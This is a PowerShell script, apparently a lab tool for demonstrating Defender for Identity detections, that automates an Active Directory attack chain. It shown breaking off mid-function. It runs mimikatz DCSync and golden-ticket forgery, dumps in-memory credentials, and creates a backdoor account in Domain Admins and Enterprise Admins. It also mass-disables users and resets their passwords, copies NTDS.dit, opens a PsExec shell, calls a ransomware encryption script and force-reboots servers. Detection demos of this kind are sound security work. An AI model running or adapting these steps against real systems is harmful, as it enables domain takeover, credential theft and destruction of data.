<#
.SYNOPSIS

Attack scenario to GO - along the kill-chain (AStGO)

Requirements:

- mimikatz.exe
- NetSess.exe
- PsExec.exe 

.DESCRIPTION

The purpose of this script is to illustrate Defender for Identity's capabilities in identifying and detecting suspicious activities and potential attacks against your network. 


.NOTES

last update: 2022-01-05
File Name  : AS2Go.ps1 | Version 2.xx
Author     : Holger Zimmermann | hozimmer@microsoft.com


.EXAMPLE

PS> cd C:\temp\AS2GO
PS> .\AS2Go.ps1


.LINK
https://docs.microsoft.com/en-us/defender-for-identity/playbook-lab-overview

#>

#Check if the current Windows PowerShell session is running as Administrator. 
#If not Start Windows PowerShell by  using the Run as Administrator option, and then try running the script again.

#Requires -RunAsAdministrator


################################################################################
######                                                                     #####
######                        Global Settings                              #####
######                                                                     #####
################################################################################

$lastupdate   = "2022-01-05"
$version      = "2.01.000" 
$path         =  Get-Location
$scriptName   =  $MyInvocation.MyCommand.Name
$scriptLog    = "$path\$scriptName.log"
$configFile   = "$path\AS2Go.xml"
$tmp          = "$path\AS2Go.tmp"
$exfiltration = "$path\exfiltration"

$exit = "x"
$yes  = "Y"
$no   = "N"
$PtH  = "H"
$PtT  = "T"
$GoldenTicket = "GT"
$InitialStart = "Start"
$PrivledgeAccount = $no

$stage00 = "COMPROMISED User Account"
$stage10 = "RECONNAISSANCE"
$stage20 = "Lateral Movement"
$stage30 = "ACCESS SENSITIVE DATA"
$stage40 = "DATA DOMAIN COMPROMISED"
$stage50 = "COMPLETE"

$global:FGCHeader     = "YELLOW"
$global:FGCCommand    = "Green"
$global:FGCQuestion   = "DarkMagenta"
$global:FGCHighLight  = "DarkMagenta"
$global:FGCError      = "Red"
$global:BDSecurePass  = ""
$global:BDUser        = ""
$global:BDCred        = ""

$GroupDA   = "Domain Admins"
$GroupEA   = "Enterprise Admins"
$GroupGPO  = "Group Policy Creator Owners"

################################################################################
######                                                                     #####
######                            All Functions                            #####
######                                                                     #####
################################################################################



function SimulateRansomare
{

    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$True)]
    [string]
    $Computer
    )

$myfunction = Get-FunctionName
Write-Log -Message "### Start Function $myfunction ###"
#####

#$Computer = "MTP-DC19"
$path       =  Get-Location
$filePrefix = (Get-Date).toString("yyyyMMdd_HHmmss")
$newFile = "$path\$filePrefix.txt"

(Get-Date).toString("yyyy:MM:dd HH:mm:ss") + "  | Hallo Ulf, vielen Dank für die Einladung!"  | Out-File -FilePath $newFile
Copy-Item -Path ".\$filePrefix.txt" -Destination "\\$Computer\c$\#unprotectedfolder" -Recurse
Invoke-Item "\\$Computer\c$\#unprotectedfolder\$filePrefix.txt"
Write-Host "`n Content from file \\$Computer\c$\#unprotectedfolder\$filePrefix.txt before encryption"

$question = "`nDo you REALLY want to run this step - Y or N? Default "
$answer   = Get-Answer -question $question -defaultValue $Yes

If ($answer -eq $yes)
   {
        #run functions
    .\HZ-encrypt-ransomware.ps1 -share "\\$Computer\c$\#unprotectedfolder"
    Write-host "`nAmong others, the following file has been encrypted" -ForegroundColor $global:FGCHighLight 
    Write-host "`  --> \\$Computer\c$\#unprotectedfolder\$filePrefix.txt" -ForegroundColor $global:FGCHighLight
    Invoke-Item "\\$Computer\c$\#unprotectedfolder\$filePrefix.txt"   
    }


#####
Write-Log -Message "### End Function $myfunction ###"
}





function Get-Directories {
    param ([string] $Path)

    Write-Host "Get-ChildItem -Path $Path  -ErrorAction Stop | where {$_.PsIsContainer}" -ForegroundColor $global:FGCCommand

    Try
    {

    # Code to get or create objects here.
    $dirs = Get-ChildItem -Path $Path  -ErrorAction Stop | where {$_.PsIsContainer} 
    # Explicitly return data to the caller.
    
    }
    Catch
    {
    #$dirs = "User has NO access to path $Path"
    Write-Host "`n   --> This account has NO access to path $Path`n" -ForegroundColor $global:FGCError

    }
    # Explicitly return data to the caller.
    $dirs | Out-File -FilePath $scriptLog -Append
    return $dirs
}


function Get-Files {
    param ([string] $Path, [string] $FileType)
    
    
    Write-Host "Get-ChildItem -Path $Path -Filter $FileType -ErrorAction SilentlyContinue" -ForegroundColor $global:FGCCommand
    $files = " "
    Try
    {
    $files = Get-ChildItem -Path $Path -Filter $FileType -ErrorAction SilentlyContinue
    }
    Catch
    {
    Write-Host "`n   --> This account has NO access to path $Path`n" -ForegroundColor $global:FGCError
    $files = "no access"
    }
    # Explicitly return data to the caller.
    $files | Out-File -FilePath $scriptLog -Append
    Start-Sleep -Seconds 1
    return $files
}




Function CreateGoldenTicket
{


$myfunction = Get-FunctionName
Write-Log -Message "### Start Function $myfunction ###"
#####

        #define the user first & last name
        $sPrefix = Get-Date -Format HHmmss    # create the first name based on hours, minutes and sec
        $sSuffix = Get-Date -Format yyyyMMdd   # create the last name based on year, month, days
        $sFakeUser = "FU-$sSuffix.$sPrefix"
        $sFakeUser = $env:USERNAME

        Clear-Host
        Write-Host "____________________________________________________________________`n" 
        Write-Host "         Step 1 of 3 | dump the 'krbtgt' Hash                       "
        Write-Host "____________________________________________________________________`n"     
        
        Write-Host "NEXT STEP: " -NoNewline
        Write-Host "mimikatz.exe ""log .\$sFakeUser.log"" ""lsadump::dcsync /domain:$fqdn /user:krbtgt""  ""exit""`n" -ForegroundColor $global:FGCCommand
        
        $question = "`nDo you want to run this step - Y or N? Default "
        $answer   = Get-Answer -question $question -defaultValue $Yes
        If ($answer -eq $yes)
            {
            .\mimikatz.exe "log .\$sFakeUser.log" "lsadump::dcsync /domain:$fqdn /user:krbtgt"  "exit"
            Invoke-Item ".\$sFakeUser.log"
            Pause
            }


        Clear-Host
        $DomainSID    = Get-KeyValue -key "DomainSID" 
        $MySearchBase = Get-KeyValue -key "MySearchBase"
        $krbtgtntml   = Get-KeyValue -key "krbtgtntml"
        
        
        Do
        {
        Write-Host "____________________________________________________________________`n" 
        Write-Host "         Step 2 of 3 |  create the GT ticket                        "
        Write-Host "____________________________________________________________________`n"     
        
        
        $question = "`n -> Is this NTLH HASH '$krbtgtntml'  for 'krbtgt'  correct - Y or N? Default "
        $prompt   = Get-Answer -question $question -defaultValue $yes
    
        if ($prompt -ne $yes) 
           {
           $krbtgtntml = Read-Host "Enter new NTML Hash for 'krbtgt'"
           Set-KeyValue -key "krbtgtntml" -NewValue $krbtgtntml
           }
           
        } Until ($prompt -eq $yes)

        
        
        Write-Host "`n NEXT STEP: " -NoNewline
        Write-Host "mimikatz.exe ""privilege::debug"" ""kerberos::purge"" ""kerberos::golden /domain:$fqdn /sid:$domainsID /rc4:$krbtgtntml /user:$sFakeUser /id:500 /groups:500,501,513,512,520,518,519 /ptt""  ""exit""`n" -ForegroundColor $global:FGCCommand
        
        $question = "`nDo you want to run this step - Y or N? Default "
        $answer   = Get-Answer -question $question -defaultValue $Yes
        
        If ($answer -eq $yes)
            {
            
            .\mimikatz.exe "privilege::debug" "kerberos::purge" "kerberos::golden /domain:$fqdn /sid:$domainsID /rc4:$krbtgtntml /user:$sFakeUser /id:500 /groups:500,501,513,512,520,518,519 /ptt" "exit" 
            #Golden ticket for 'FU-20210816.111659 @ threatprotection.corp' successfully submitted for current session
            Pause
            Clear-Host
            Write-Host "____________________________________________________________________`n" 
            Write-Host "        Displays a list of currently cached Kerberos tickets        "
            Write-Host "____________________________________________________________________`n" 
            
            Write-Host "NEXT STEP: " -NoNewline
            Write-Host "KLIST`n" -ForegroundColor $global:FGCCommand
            Pause
            Set-NewColorSchema -NewStage $GoldenTicket
            klist
            Write-Host ""
            Pause
            
            
            Clear-Host
            Write-Host "____________________________________________________________________`n" 
            Write-Host "         Step 3 of 3 |  make some change for current session        "
            Write-Host "____________________________________________________________________`n"     
            Pause

            Access-Directory -directory "\\$mydc\c$\*.*"
            Get-ADUser -filter * -SearchBase $MySearchBase | select -first 10  | ft
            Get-ADUser -filter * -SearchBase $MySearchBase | select -first 10  | Set-ADUser –replace @{info=”$sFakeUser was here”}
            Write-Host ""
            Pause
            }

#####
Write-Log -Message "### End Function $myfunction ###"
}





function Restart-VictimMachines
{

$myfunction = Get-FunctionName
Write-Log -Message "### Start Function $myfunction ###"
#####


    $commment = "Usecase $UseCase | Your network was hacked. All machines will be rebooted in $time2reboot seconds!!!!"

      try
        {
        # only for Windows 10 machines
        #https://www.windowscentral.com/how-remote-shutdown-computer-windows-10
        $Win10Maschine = "mtp-pc10"
        net use \\$Win10Maschine\ipc$
        shutdown /r /f /c $commment /t $time2reboot /m \\$Win10Maschine
        }
      catch
        {
        # do nothing
        }        
        
        shutdown /r /f /c $commment /t $time2reboot /m \\$mydc
        shutdown /r /f /c $commment /t $time2reboot /m \\$myViPC
        shutdown /r /f /c $commment /t $time2reboot /m \\$myAppServer
        shutdown /r /f /c $commment /t $time2reboot /m \\$mySAW



#####
Write-Log -Message "### End Function $myfunction ###"
}

function template
{

    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$True)]
    [string]
    $question,

    [Parameter(Mandatory=$False)]
    [string]
    $defaultValue
    )

$myfunction = Get-FunctionName
Write-Log -Message "### Start Function $myfunction ###"
#####


#####
Write-Log -Message "### End Function $myfunction ###"
}

function New-HoneytokenActivity {

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #####
    $honeytoken = Get-KeyValue -key "honeytoken"
    $randowmPW = Get-RandomPassword 


    Try {
        $HTSecurePass = ConvertTo-SecureString -String $randowmPW -AsPlainText -Force
        $Credential = New-Object System.Management.Automation.PSCredential $honeytoken, $HTSecurePass
        Get-ADUser -Filter * -Server $myDc -Credential $Credential
    }
    Catch {
        Write-Host "Created Honeytoken activity for $honeytoken | Attempted to login and authenticate" -ForegroundColor $global:FGCHighLight
        Write-Log -Message "Created Honeytoken activity for $honeytoken"
    }
        
    #####
    Write-Log -Message "### End Function $myfunction ###"
}

function Start-UserManipulation {

    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$True)]
    [string]
    $SearchBase
    )

$myfunction = Get-FunctionName
Write-Log -Message "### Start Function $myfunction ###"
#####

Get-ADUser -filter * -SearchBase $MySearchBase -Properties canonicalName, Modified, passwordlastset  | select sAMAccountName, Enabled, Modified, passwordlastset, userPrincipalName, name | ft

$count=(Get-ADUser -filter * -SearchBase $MySearchBase).count
Write-Host "`nFound $count AD Users to modify!" -ForegroundColor $global:FGCHighLight
Write-Host "`n`n"
Pause
Clear-Host
Write-Host "____________________________________________________________________`n" 
Write-Host "                Try to disable all users                            "
Write-Host "____________________________________________________________________`n" 
Write-Host "`n NEXT STEP: " -NoNewline
Write-Host "get-aduser -filter * -SearchBase $MySearchBase | Disable-ADAccount`n" -ForegroundColor $FGCCommand

$question = "`nDo you want to disable $count users  - Y or N? Default "
$answer   = Get-Answer -question $question -defaultValue $Yes

If ($answer -eq $yes)
   {
   get-aduser -filter * -SearchBase $MySearchBase |  select -First 100 | Disable-ADAccount
   Write-Host ""   
   Write-Host "Get-ADUser -filter * -Properties canonicalName, Modified, passwordlastset | select sAMAccountName, Enabled, Modified, passwordlastset, userPrincipalName, name | select -First 20 | ft" -ForegroundColor $FGCCommand
   Get-ADUser -filter * -SearchBase $MySearchBase -Properties canonicalName, Modified, passwordlastset  | select sAMAccountName, Enabled, Modified, passwordlastset, userPrincipalName, name | select -First 20 | ft
   Write-Host ""   
   Pause
   }

Clear-Host
$newRandomPW = Get-RandomPassword

Write-Host "____________________________________________________________________`n" 
Write-Host "        Try to reset all users password                             "
Write-Host "____________________________________________________________________`n" 
Write-Host "`n NEXT STEP: " -NoNewline
Write-Host "Set-ADAccountPassword -Reset -NewPassword $newRandomPW`n" -ForegroundColor $FGCCommand

$question = "`nDo you also want to reset user's password with an random password '$newRandomPW' - Y or N? Default "
$answer   = Get-Answer -question $question -defaultValue $Yes

If ($answer -eq $yes)
    {
    $newRandomPW = Get-RandomPassword
    $SecurePass = ConvertTo-SecureString -String $newRandomPW -AsPlainText -Force
    get-aduser -filter * -SearchBase $MySearchBase |  select -First 100 | Set-ADAccountPassword -Reset -NewPassword $SecurePass
    Write-Host ""     
    Write-Host "Get-ADUser -filter * -Properties canonicalName, Modified, passwordlastset | select sAMAccountName, Enabled, Modified, passwordlastset, userPrincipalName, name | select -First 20 | ft" -ForegroundColor $FGCCommand    
    Get-ADUser -filter * -SearchBase $MySearchBase -Properties canonicalName, Created, Modified, passwordlastset  | select sAMAccountName, Enabled, Modified, passwordlastset, userPrincipalName, name | select -First 20 | ft
    Write-Host "" 
    Pause
}


#CleanUp
Get-aduser -filter * -SearchBase $MySearchBase | Enable-ADAccount

#####
Write-Log -Message "### End Function $myfunction ###"
}

function New-BackDoorUser {

$myfunction = Get-FunctionName
Write-Log -Message "### Start Function $myfunction ###"
#####

#define the user first & last name
$sPrefix = Get-Date -Format HHmmss    # create the first name based on hours, minutes and sec
$sSuffix = Get-Date -Format yyyyMMdd   # create the last name based on year, month, days

$sSamaccountName    = "BD-$sSuffix.$sPrefix"
$sname              =  $sSamaccountName
$sPath              =  Get-KeyValue -key "BDUsersOU"
$sFirstName         = "HoZi"
$sLastname          = "Hacker"
$Initials           = "HtH"
$sDisplayName       = "Hozi the Hacker ($sSamaccountName)"
$sUPNSuffix         = "@HoziTheHacker.de"
$title              = "Backdoor User"
$sUserPrincipalName =  ($sSamaccountName + $sUPNSuffix)
$TimeSpan           =  New-TimeSpan -Days 7 -Hours 0 -Minutes 0 #Account expires after xx Days
$bthumbnailPhoto    = ".\AS2Go_BD-User.jpg"
$sDescription       = "AS2GO Demo | Backdoor User"

$BDUserPW = Get-RandomPassword
$global:BDSecurePass = ConvertTo-SecureString -String $BDUserPW -AsPlainText -Force
$global:BDUser       = $sSamaccountName
new-aduser -UserPrincipalName $sUserPrincipalName -Name $sName -SamAccountName $sSamaccountName -GivenName $sFirstName -Surname $sLastname -DisplayName $sDisplayName -PasswordNeverExpires $false -Path $sPath -AccountPassword $global:BDSecurePass -PassThru | Enable-ADAccount


Add-ADGroupMember -Identity $GroupDA -Members $sSamaccountName
Add-ADGroupMember -Identity $GroupEA -Members $sSamaccountName
Add-ADGroupMember -Identity $GroupGPO -Members $sSamaccountName  

Set-ADUser $sSamaccountName -Replace @{thumbnailPhoto=([byte[]](Get-Content $bthumbnailPhoto -Encoding byte))} -Initials $Initials -Title $title -Description $sDescription


Set-KeyValue -key "LastBDUser" -NewValue $sSamaccountName

Write-Host "`n`nSUMMARY:" -ForegroundColor Green
Write-Host     "========" -ForegroundColor Green
Get-ADUser -Identity $sSamaccountName -Properties canonicalName, Created  | select sAMAccountName, Created, userPrincipalName, name, canonicalName | ft
Get-ADPrincipalGroupMembership -Identity $sSamaccountName | ft

#### create credentional for further actions
$global:BDCred = New-Object System.Management.Automation.PSCredential $sUserPrincipalName, $global:BDSecurePass


Write-Log -Message "    Backdoor User '$sSamaccountName' created"

#####
Write-Log -Message "### End Function $myfunction ###"
}

function Update-WindowTitle {

    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$True)]
    [string]
    $NewTitle)

$myfunction = Get-FunctionName
Write-Log -Message "### Start Function $myfunction ###"
#####
$host.ui.RawUI.WindowTitle = $NewTitle
Write-Log -Message "    change title to $NewTitle"
#####
Write-Log -Message "### End Function $myfunction ###"
}

function Stop-AS2GoDemo {

    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$False)]
    [string]
    $NextStepReboot=$no
    )

$myfunction = Get-FunctionName
Write-Log -Message "### Start Function $myfunction ###"
#####

Clear-Host

$closing = "DONE!"
Write-Host $closing -ForegroundColor $global:FGCCommand
Write-Log -Message "$closing`n`n"
Update-WindowTitle -NewTitle $closing

$StartDate = Get-KeyValue -key "LastStart" 
$EndDate   = (Get-Date).toString("yyyy-MM-dd HH:mm:ss")
$duration  = NEW-TIMESPAN –Start $StartDate –End $EndDate
Write-host "finished after $duration [h]"

Set-KeyValue -key "LastStage" -NewValue $stage50
Set-KeyValue -key "LastFinished" -NewValue  $enddate
Set-KeyValue -key "LastDuration" -NewValue "$duration [h]"

Write-Log -Message "Start Time: $StartDate"
Write-Log -Message "End Time  : $EndDate"
Write-Log -Message "Total Time: $duration"

Invoke-Item $scriptLog
Invoke-Item .\step_020.html

If ($NextStepReboot -ne $yes)
{
exit
}

#####
Write-Log -Message "### End Function $myfunction ###"
}

function Start-Exfiltration {

Show-Step step_010.html

$myfunction = Get-FunctionName
Write-Log -Message "### Start Function $myfunction ###"
#####

net view \\$mydc

Pause

Access-Directory -directory $OfflineDITFile


#dir \\%mydc%\ad-backup
Pause
Clear-Host
Write-Host "____________________________________________________________________`n" 
Write-Host "             try to open cmd console on $myAppServer"
Write-Host "____________________________________________________________________`n" 
write-host "Start-Process .\PsExec.exe -ArgumentList ""\\$myAppServer -accepteula cmd.exe""" -ForegroundColor $global:FGCCommand
write-host ""
write-host ""

try
{
Write-Output "more C:\temp\as2go\my-passwords.txt" | Set-Clipboard
}
catch
{
Write-Output "more C:\temp\as2go\my-passwords.txt" | clip
}


Pause
Start-Process .\PsExec.exe -ArgumentList "\\$myAppServer -accepteula cmd.exe"
write-host ""
write-host ""
write-host " Try to find some sensitive data. e.g. files with passwords" -ForegroundColor $global:FGCCommand
write-host " more C:\temp\as2go\my-passwords.txt`n" -ForegroundColor $global:FGCCommand

Pause
Clear-Host

Show-Step step_011.html
Write-Host "____________________________________________________________________`n" 
Write-Host "                  Data exfiltration over SMB Share                  "
Write-Host "____________________________________________________________________`n" 
Pause
New-Item $exfiltration -ItemType directory -ErrorAction Ignore
write-host " Copy-Item -Path $OfflineDITFile\*.* -Destination $exfiltration" -ForegroundColor $global:FGCCommand
Copy-Item -Path $OfflineDITFile\*.* -Destination $exfiltration
write-host ""
write-host "Get-Item $exfiltration\*.dit" -ForegroundColor $global:FGCCommand
Get-Item .\*.dit -Force
Pause

#####
Write-Log -Message "### End Function $myfunction ###"
}

Function Set-NewColorSchema {

    Param(
    [Parameter(Mandatory=$True)]
    [string]
    $NewStage)

$myfunction = Get-FunctionName
Write-Log -Message "### Start Function $myfunction ###"
#####

<#

Powershell color names are:

Black   White
Gray    DarkGray
Red     DarkRed
Blue    DarkBlue
Green   DarkGreen
Yellow  DarkYellow
Cyan    DarkCyan
Magenta DarkMagenta

Set-NewBackgroundColor -BgC "Blue" -FgC "White"

#>



If ($NewStage -eq $PtH)
    {
    $global:FGCCommand    = "Green"
    $global:FGCQuestion   = "Yellow"
    $global:FGCHighLight  = "Yellow"
    $global:FGCError      = "DarkBlue"
    Set-NewBackgroundColor -BgC "DarkBlue" -FgC "White"
    }
elseif ($NewStage -eq $PtT)
    {
    $global:FGCCommand    = "Green"
    $global:FGCQuestion   = "Yellow"
    $global:FGCHighLight  = "Yellow"
    $global:FGCError      = "Red"
    Set-NewBackgroundColor -BgC "Black" -FgC "White"
	}
elseif ($NewStage -eq $GoldenTicket)
    {
    $global:FGCCommand    = "Green"
    $global:FGCQuestion   = "Yellow"
    $global:FGCHighLight  = "Yellow"
    $global:FGCError      = "Black"
    Set-NewBackgroundColor -BgC "DarkRed" -FgC "White"
    }
else
    {
    $global:FGCCommand    = "GREEN"
    $global:FGCQuestion   = "YELLOW"
    $global:FGCHighLight  = "YELLOW" 
    $global:FGCError      = "RED"
    Set-NewBackgroundColor -BgC "Black" -FgC "Gray"
    }

Write-Log -Message "Set Color Schema for $NewStage"
#####
Write-Log -Message "### End Function $myfunction ###"




}

Function Set-NewBackgroundColor {

    Param(
    [Parameter(Mandatory=$True)]
    [string]
    $BgC,

    [Parameter(Mandatory=$True)]
    [string]
    $FgC)

$myfunction = Get-FunctionName
Write-Log -Message "### Start Function $myfunction ###"
#####

$a = (Get-Host).UI.RawUI
$a.BackgroundColor = $BgC
$a.ForegroundColor = $FgC ; Clear-Host

Write-Log -Message "New Color Set $Bgc and $Fgc"


#####
Write-Log -Message "### End Function $myfunction ###"

<#

Powershell color names are:

Black White
Gray DarkGray
Red DarkRed
Blue DarkBlue
Green DarkGreen
Yellow DarkYellow
Cyan DarkCyan
Magenta DarkMagenta

Set-NewBackgroundColor -BgC "Blue" -FgC "White"

#>


}

Function Get-Answer {

    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$True)]
    [string]
    $question,

    [Parameter(Mandatory=$False)]
    [string]
    $defaultValue
    )


write-host $question  -ForegroundColor $global:FGCQuestion -NoNewline
$prompt = Read-Host "[$($defaultValue)]" 
if ($prompt -eq "") {$prompt = $defaultValue} 
return $prompt.ToUpper()
}

Function Get-KeyValue {

# Read Config from XML file

    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$True)]
    [string]
    $key
    )



[XML]$AS2GoConfig = Get-Content $configFile
$MyKey = $AS2GoConfig.Config.DefaultParameter.ChildNodes | where key -EQ $key
return $MyKey.value
}

Function Set-KeyValue {

# Update Config XML file

    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$True)]
    [string]
    $key,

    [Parameter(Mandatory=$False)]
    [string]
    $NewValue
    )


[XML]$AS2GoConfig = Get-Content $configFile
$MyKey = $AS2GoConfig.Config.DefaultParameter.ChildNodes | where key -EQ $key
$MyKey.value = $NewValue
$AS2GoConfig.Save($configFile)

Write-Log -Message "Update key '$key' with new value '$NewValue'"

}

function Get-RandomPassword {

# Generate random password
Write-Log -Message "### Start Function random password ###"

$chars = "abcdefghijkmnopqrstuvwxyzABCEFGHJKLMNPQRSTUVWXYZ1234567890".ToCharArray()
$nums = "1234567890".ToCharArray()
$schars = "+-$!".ToCharArray()

$newPassword = ""
1..9 | ForEach {  $newPassword += $chars | Get-Random }
1..1 | ForEach {  $newPassword += $nums | Get-Random }
1..1 | ForEach {  $newPassword += $schars | Get-Random }
1..1 | ForEach {  $newPassword += $nums | Get-Random }
1..1 | ForEach {  $newPassword += $schars | Get-Random }
Write-Log -Message $newPassword
Write-Log -Message "### End Function random password ###"
return $newPassword
}


function Get-AS2GoSettings {


$myfunction = Get-FunctionName
Write-Log -Message "### Start Function $myfunction ###"
#####

Write-Host "____________________________________________________________________`n" 
Write-Host "                      Check and Update the Settings                 "
Write-Host "____________________________________________________________________`n" 

      Do
   {


#read values from the system
$DomainName     = (Get-ADDomain).DNSRoot
$DomainSID      = (Get-ADDomain).DomainSID.Value
$myViPC         = $env:COMPUTERNAME
$myDC           = $env:LOGONSERVER.Substring(2) 

Set-KeyValue -key "fqdn" -NewValue $DomainName
Set-KeyValue -key "DomainSID" -NewValue $DomainSID
Set-KeyValue -key "myViPC" -NewValue $myViPC
Set-KeyValue -key "mydc" -NewValue $myDC


#read values from AS2Go.xml config file
$myDC =           Get-KeyValue -key "myDC" 
$mySAW =          Get-KeyValue -key "mySAW" 
$myViPC =         Get-KeyValue -key "myViPC"
$fqdn =           Get-KeyValue -key "fqdn"
$pthntml =        Get-KeyValue -key "pthntml"
$krbtgtntml =     Get-KeyValue -key "krbtgtntml"
$ImageViewer =    Get-KeyValue -key "ImageViewer"
$globalHelpDesk = Get-KeyValue -key "globalHelpDesk"
$ticketsUNCPath = Get-KeyValue -key "ticketsPath"
$ticketsDir     = Get-KeyValue -key "ticketsDir"
$time2reboot    = Get-KeyValue -key "time2reboot"
$BDUsersOU      = Get-KeyValue -key "BDUsersOU"
$MySearchBase   = Get-KeyValue -key "MySearchBase"
$OfflineDITFile = Get-KeyValue -key "OfflineDITFile"
$myAppServer    = Get-KeyValue -key "myAppServer"
$honeytoken     = Get-KeyValue -key  "honeytoken"






# fill the arrays
$MyParameter = @("Logon Server / DC         ",`
                 "Victim PC                 ",`
                 "Admin PC                  ",`
                 "Application Server        ",`
                 "Help Desk Group           ",`
                 "MDI Honeytoken            ",`
                 "Domain Name               ",`
                 "Domain siD                ",`
                 "NTML Hash Helpdesk        ",`
                 "NTML Hash krbtgt          ",`
                 "Seconds to reboot         ",`
                 "AD Search Base            ",`
                 "OU for BD User            ",`
                 "Tickets UNC Path (suffix) ",`
                 "Tickets Directory         ",`
                 "NTDS Dit File (Backup)    ",`
                 "Image Viewer              ")

$MyValue     = @($myDC,`
                 $myViPC,`
                 $mySAW,`
                 $myAppServer,`
                 $globalHelpDesk,`
                 $honeytoken,`
                 $DomainName,`
                 $DomainSID,`
                 $pthntml,`
                 $krbtgtntml,`
                 $time2reboot,`
                 $MySearchBase,`
                 $BDUsersOU,`
                 $ticketsUNCPath,`
                 $ticketsDir,`
                 $OfflineDITFile,`
                 $ImageViewer)

$MyKey       = @("myDC",`
                 "myViPC",`
                 "mySAW",`
                 "myAppServer",`
                 "globalHelpDesk",`
                 "honeytoken",`
                 "DomainName",`
                 "DomainSID",`
                 "pthntml",`
                 "krbtgtntml",`
                 "time2reboot",`
                 "MySearchBase",`
                 "BDUsersOU",`
                 "ticketsUNCPath",`
                 "ticketsDir",`
                 "OfflineDITFile",`
                 "ImageViewer")



# list the current values
for ($counter = 0; $counter -lt $MyParameter.Length; $counter++ )
{
    write-host $counter ":" $MyParameter.Get($counter) " = " $MyValue.Get($counter) # -ForegroundColor Yellow
}


$question = "`n -> Are theses values correct - Y or N? Default "
$prompt   = Get-Answer -question $question -defaultValue $yes

if ($prompt -ne $yes) 
   {
   $counter = 10
   $question = "`n -> Please enter the desired setting number. Default "
   $counter   = Get-Answer -question $question -defaultValue $counter

   try
        {
        write-host "`n`nChange value for " $MyParameter.Get($counter) " = " $MyValue.Get($counter) -ForegroundColor $global:FGCCommand
        $newvaulue = Read-Host "Please type in the new value:"
        Set-KeyValue -key $MyKey.Get($counter)  -NewValue $newvaulue
                }
   catch
        {
         write-host  "$counter = Falscher Wert"
        }

        Finally
        {
        # list the current values
        Get-AS2GoSettings
        }

  }


# End "Do ... Until" Loop?
$question = "`nDo you need to update more settings - Y or N? Default "
$repeat   = Get-Answer -question $question -defaultValue $no
   
   } Until ($repeat -eq $no)


#####
Write-Log -Message "### End Function $myfunction ###"
}

function Access-Directory {

    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$True)]
    [string]
    $directory
    )

$myfunction = Get-FunctionName
Write-Log -Message "### Start Function $myfunction ###"
#####

Get-ChildItem -Path $directory

Write-Host "`nGet-ChildItem -Directory $directory -Filter *.* -ErrorAction SilentlyContinue -Force" -ForegroundColor $global:FGCCommand

#Get-Item "$directory"
#$content = Get-ChildItem -Directory $directory -Force -ErrorAction SilentlyContinue
#clear
#$directory = "\\mtp-ms12\c$"

Try
{
Get-ChildItem -Path $directory | Out-File -FilePath .\Process.txt
#dir $directory -Force -ErrorAction Stop
Write-Host "`n   --> You have ACCESS to direcotry '$directory'`n" -ForegroundColor $global:FGCQuestion
}
catch
{
Write-Host "`n   --> No(!) ACCESS to direcotry '$directory'`n"    -ForegroundColor $global:FGCError
}


return



#####
Write-Log -Message $directory
Write-Log -Message "### End Function $myfunction ###"
}


function Access-Directory1 {

    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$True)]
    [string]
    $directory
    )

$myfunction = Get-FunctionName
Write-Log -Message "### Start Function $myfunction ###"
#####

Get-ChildItem -Path $directory

Write-Host "`nGet-ChildItem -Directory $directory -Filter *.* -ErrorAction SilentlyContinue -Force" -ForegroundColor $global:FGCCommand

#Get-Item "$directory"
#$content = Get-ChildItem -Directory $directory -Force -ErrorAction SilentlyContinue
#clear
#$directory = "\\mtp-ms12\c$"

Try
{
Get-ChildItem -Path $directory
#dir $directory -Force -ErrorAction Stop
Write-Host "`n   --> You have ACCESS to direcotry '$directory'`n" -ForegroundColor $global:FGCQuestion
}
catch
{
Write-Host "`n   --> No(!) ACCESS to direcotry '$directory'`n"    -ForegroundColor $global:FGCError
}






#####
Write-Log -Message $directory
Write-Log -Message "### End Function $myfunction ###"
}


function Get-SensitveADUser {

    [CmdletBinding()]
    Param(
    [Parameter(Mandatory=$True)]
    [string]
    $group
    )

$myfunction = Get-FunctionName
Write-Log -Message "### Start Function $myfunction ###"
#####


Try
{


#$content = Get-ADGroupMember -Identity $group -ErrorAction SilentlyContinue
Get-ADGroupMember -Identity $group -Recursive | ft SamAccountName, objectClass, name, distinguishedName -ErrorAction SilentlyContinue -AutoSize
}

catch
{
 Write-Host "   --> No ACCESS to group '$group'`n`n" -ForegroundColor $global:FGCError
}
<#
If ($content)
{
    
}
else
{
    Write-Host "No ACCESS to group $group" -ForegroundColor $global:FGCError
}
#>

#####
Write-Log -Message $group
Write-Log -Message "### End Function $myfunction ###"
}

function Start-PtH-Attack {
$myfunction = Get-FunctionName
Write-Log -Message "### Start Function $myfunction ###"
#####
Clear-Host
Write-Host "____________________________________________________________________`n" 
Write-Host "           Starting Pass-the-Hash (PtH) Attack on VictimPC          "
Write-Host "____________________________________________________________________`n" 
Write-Host "____________________________________________________________________`n" 
Write-Host "              Try to find a PRIVILEDGE account                      " 
Write-Host "              e.g. member of Helpdesk Group                         " 
Write-Host "____________________________________________________________________`n" 
Write-Host ""
Write-Host "net localgroup Administrators" -ForegroundColor $global:FGCCommand
Write-Host ""
Write-Host ""
net localgroup Administrators
Write-Host ""
Write-Host ""
Write-Host "Get-ADGroupMember -Identity $globalHelpDesk -Recursive | ft" -ForegroundColor $global:FGCCommand
Write-Host ""
Get-SensitveADUser -group $globalHelpDesk
#dsquery group -samid "$globalHelpDesk" | dsget group -members -expand
Pause
Clear-Host

Write-Host "____________________________________________________________________`n" 
Write-Host "          Try to Dump Credentials In-Memory from VictimPC           " 
Write-Host "____________________________________________________________________`n" 
Write-Host ""


$logfile = "$helpdeskuser.log"
Write-host "`nNext Step: " -NoNewline
write-host ".\mimikatz.exe ""log .\$logfile"" ""privilege::debug"" ""sekurlsa::logonpasswords"" ""exit""" -ForegroundColor $global:FGCCommand

$question = "`nDo you want to run this step - Y or N? Default "
$answer   = Get-Answer -question $question -defaultValue $Yes

If ($answer -eq $yes)
{
    #Invoke-Expression -Command:$command
    .\mimikatz.exe "log .\$logfile" "privilege::debug" "sekurlsa::logonpasswords" "exit"
    Invoke-Item ".\$helpdeskuser.log"
